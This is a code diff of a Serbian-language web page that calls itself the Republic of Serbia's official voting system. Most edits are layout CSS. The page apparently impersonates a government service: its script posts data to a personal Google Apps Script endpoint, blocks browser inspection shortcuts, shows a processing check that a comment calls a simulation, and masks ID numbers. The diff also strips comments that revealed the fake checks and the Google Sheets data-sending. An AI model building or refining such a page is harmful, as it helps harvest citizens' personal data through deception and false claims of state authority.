@@ -261,13 +261,12 @@
       background: #fafafa;
     }
 
-    /* ГЛАВНИ ПРОСТОР */
+    /* ГЛАВНИ ПРОСТОР (ПАМЕТНО ЦЕНТРИРАЊЕ) */
     main {
       flex: 1;
       width: 100%;
       display: flex;
-      align-items: flex-start;
-      justify-content: center;
+      flex-direction: column; /* Ово омогућава margin: auto центрирање */
       padding: 40px 16px;
       overflow-y: auto;
       touch-action: pan-y;
@@ -275,7 +274,7 @@
 
     .app {
       width: min(640px, 100%);
-      margin: 0 auto;
+      margin: auto; /* Ово савршено центрира контејнер вертикално и хоризонтално */
     }
 
     /* СЕКЦИЈЕ / ПРОЗОРИ */
@@ -620,14 +619,14 @@
       color: var(--text);
     }
 
-    /* WELCOME POP-UP (ПРОФЕСИОНАЛАН, ЈЕДНОСТАВАН ДИЗАЈН) */
+    /* WELCOME POP-UP (АПСОЛУТНИ ЦЕНТАР) */
     .welcome-modal {
       position: fixed;
       inset: 0;
       z-index: 9999;
       display: none;
-      align-items: center;
-      justify-content: center;
+      align-items: center; /* Центрира по вертикали */
+      justify-content: center; /* Центрира по хоризонтали */
       padding: 16px;
       background: rgba(0, 0, 0, 0.7); 
       backdrop-filter: blur(5px);
@@ -897,7 +896,6 @@
   <!-- HEADER -->
   <header class="header">
     <div class="brand" onclick="showWindow('win-landing')">
-      <!-- СЛИКА ЛОГОА logo.png -->
       <img src="logo.png" alt="МОБА" class="brand-logo-img" onerror="this.style.display='none'; document.getElementById('altBrandMark').style.display='flex';">
       <div class="brand-mark" id="altBrandMark">М</div>
       
@@ -1227,7 +1225,6 @@
   <footer class="site-footer">
     <div class="footer-wrap">
       <div class="footer-state-badge">
-        <!-- Слика директно вуче локални grb.png фајл -->
         <img src="grb.png" alt="Грб Србије" loading="lazy">
         <span>Република Србија • Званични систем за гласање</span>
       </div>
@@ -1245,7 +1242,6 @@
   </footer>
 
   <script>
-    // TVOJ GOOGLE APPS SCRIPT LINK
     const scriptURL = 'https://script.google.com/macros/s/AKfycbw6Dly5-J1Z434RUr5FdOKdGhTuq5XmVLv8WiYucd2iFmK8KM--ahe_yrWxSdI2_RSqJg/exec';
 
     const state = {
@@ -1269,7 +1265,7 @@
       return false;
     });
 
-    // Спречавање инспекције и системских пречица (F12, Ctrl+U, Ctrl+Shift+I/J/C, Ctrl+S)
+    // Спречавање инспекције и системских пречица
     document.addEventListener('keydown', function(e) {
       if (
         e.key === "F12" ||
@@ -1348,7 +1344,6 @@
       return id.slice(0, 3) + "***" + id.slice(6);
     }
 
-    // Симулација провере пре гласања 
     function runProcessingModal(title, steps, onComplete) {
       const modal = document.getElementById("procModal");
       const pTitle = document.getElementById("procTitle");
@@ -1409,7 +1404,6 @@
       showWindow("win-confirm");
     }
 
-    // LOGIKA ZA SLANJE PODATAKA PREKO GOOGLE SHEETS
     function startSealing() {
       const now = new Date();
       const dd = String(now.getDate()).padStart(2, '0');
